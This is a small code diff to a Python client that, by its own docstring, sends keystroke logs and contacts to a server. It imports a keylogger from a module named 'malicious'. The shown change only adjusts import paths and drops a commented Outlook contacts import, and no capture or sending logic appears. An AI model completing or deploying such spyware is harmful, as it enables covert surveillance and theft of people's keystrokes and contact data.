@@ -5,10 +5,12 @@ Client that sends key logs and contacts to server
 
 import os
 import sys
+
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server')))
+
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-# from outlook.contacts import Contacts
 from server.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
 from malicious import keylogger
 from server.clnt.protocol import Protocol
